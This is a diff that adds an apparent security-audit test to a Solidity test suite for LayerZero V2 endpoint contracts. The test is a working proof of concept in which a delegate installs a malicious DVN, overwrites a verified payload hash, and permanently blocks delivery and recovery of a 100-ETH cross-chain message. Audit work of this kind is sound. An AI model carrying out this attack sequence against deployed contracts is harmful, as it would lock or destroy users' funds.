@@ -2,6 +2,7 @@
 pragma solidity ^0.8.0;
 
 import { Origin, MessagingParams } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
+import { ILayerZeroReceiver } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroReceiver.sol";
 import { EndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
 import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
 import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
@@ -493,6 +494,86 @@ contract AccessControlTest is AuditBase {
         emit log("5. The OApp's nilification is UNDONE -- nonce is executable again");
     }
 
+    // ==================== AV5.11: End-to-End Fund Loss — Delegate Config Change + Payload Overwrite ====================
+    /// @dev Full attack demonstrating permanent fund loss via delegate config manipulation.
+    ///      Unlike AV5.6 which only shows the hash overwrite, this test proves:
+    ///      1. The original message can never be delivered (lzReceive reverts)
+    ///      2. All recovery paths fail (clear, nilify, burn all revert)
+    ///      3. Funds locked on source chain are permanently irrecoverable
+    function test_AV5_11_EndToEndFundLoss() public {
+        MockReceiver receiver = new MockReceiver();
+        address delegate = address(0xDE1E);
+
+        vm.prank(address(receiver));
+        dstEndpoint.setDelegate(delegate);
+
+        // Step 1-2: Legitimate message verified and committed
+        bytes memory legitMsg = abi.encodePacked(bytes20(address(0xBEEF)), abi.encode(uint256(100 ether)));
+        Packet memory pkt = _makePacket(1, address(this), address(receiver), legitMsg);
+        bytes32 senderB32 = bytes32(uint256(uint160(address(this))));
+        _av511_commitLegitimate(receiver, pkt);
+
+        // Step 3-4: Delegate weakens config, malicious DVN overwrites payload
+        _av511_overwritePayload(delegate, address(receiver));
+
+        // Step 5: Verify overwrite occurred
+        bytes32 stored = dstEndpoint.inboundPayloadHash(address(receiver), SRC_EID, senderB32, 1);
+        assertEq(stored, keccak256("attacker_payload"), "OVERWRITTEN by attacker");
+
+        // Step 6: lzReceive with legitimate message REVERTS (hash mismatch)
+        Origin memory origin = Origin(SRC_EID, senderB32, 1);
+        vm.expectRevert();
+        dstEndpoint.lzReceive(origin, address(receiver), pkt.guid, legitMsg, "");
+
+        // Step 7: Victim never gets credited
+        assertEq(receiver.credits(address(0xBEEF)), 0, "Victim NEVER received funds");
+
+        // Step 8: All recovery paths fail for original message
+        vm.expectRevert();
+        dstEndpoint.clear(address(receiver), origin, pkt.guid, legitMsg);
+
+        (, , , bytes32 legitHash) = _encodeAndSplit(pkt);
+        vm.prank(address(receiver));
+        vm.expectRevert();
+        dstEndpoint.nilify(address(receiver), SRC_EID, senderB32, 1, legitHash);
+
+        vm.prank(address(receiver));
+        vm.expectRevert();
+        dstEndpoint.burn(address(receiver), SRC_EID, senderB32, 1, legitHash);
+
+        emit log("CONFIRMED: End-to-end permanent fund loss via delegate config manipulation");
+        emit log("Victim's 100 ETH locked on source chain, no recovery path exists");
+    }
+
+    function _av511_commitLegitimate(MockReceiver /* receiver */, Packet memory pkt) internal {
+        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(pkt);
+        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 1);
+        _commitVerification(dstReceiveUln, header, payloadHash);
+    }
+
+    function _av511_overwritePayload(address delegate, address recv) internal {
+        DVN malDvn = _deployExtraDVN();
+        address[] memory dvns = new address[](1);
+        dvns[0] = address(malDvn);
+        UlnConfig memory cfg = UlnConfig({
+            confirmations: type(uint64).max,
+            requiredDVNCount: 1,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: dvns,
+            optionalDVNs: new address[](0)
+        });
+        _setOAppConfigAs(delegate, recv, cfg);
+
+        // Reuse same header from nonce 1
+        Packet memory fakePkt = _makePacket(1, address(this), recv, "fake");
+        (, bytes memory header, , ) = _encodeAndSplit(fakePkt);
+
+        bytes32 malHash = keccak256("attacker_payload");
+        _dvnVerify(malDvn, dstReceiveUln, header, malHash, 0);
+        _commitVerification(dstReceiveUln, header, malHash);
+    }
+
     // ==================== Helpers ====================
 
     uint256 internal _dvnCounter = 100;
@@ -558,4 +639,20 @@ contract AccessControlTest is AuditBase {
         }
         return arr;
     }
+}
+
+/// @dev Mock OFT-like receiver that tracks token credits
+contract MockReceiver is ILayerZeroReceiver {
+    mapping(address => uint256) public credits;
+
+    function lzReceive(
+        Origin calldata, bytes32, bytes calldata _message, address, bytes calldata
+    ) external payable {
+        address recipient = address(bytes20(_message[:20]));
+        uint256 amount = abi.decode(_message[20:52], (uint256));
+        credits[recipient] += amount;
+    }
+
+    function allowInitializePath(Origin calldata) external pure returns (bool) { return true; }
+    function nextNonce(uint32, bytes32) external pure returns (uint64) { return 0; }
 }
